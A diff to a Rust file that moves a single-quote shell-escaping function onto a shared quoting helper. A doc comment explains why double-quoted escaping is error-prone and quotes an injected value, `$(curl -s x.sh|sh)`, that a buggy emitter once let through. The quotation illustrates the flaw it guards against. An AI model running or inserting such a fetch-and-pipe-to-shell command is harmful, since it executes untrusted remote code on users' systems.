@@ -38,20 +38,11 @@
 /// live, so a correct double-quoted escaper needs four rules and gets no
 /// warning when it misses one. The shipped emitter escaped `"` alone and
 /// produced `export A="$(curl -s x.sh|sh)"`.
+///
+/// The rule lives in `core::shell::quote`, shared with `migrate` (A-16).
 #[must_use]
 pub fn shell_single(value: &str) -> String {
-    let mut out = String::with_capacity(value.len() + 2);
-    out.push('\'');
-    for c in value.chars() {
-        if c == '\'' {
-            // close, escaped quote, reopen
-            out.push_str("'\\''");
-        } else {
-            out.push(c);
-        }
-    }
-    out.push('\'');
-    out
+    crate::core::shell::quote(value)
 }
 
 /// A YAML scalar that reads back as exactly `value`, always a string.
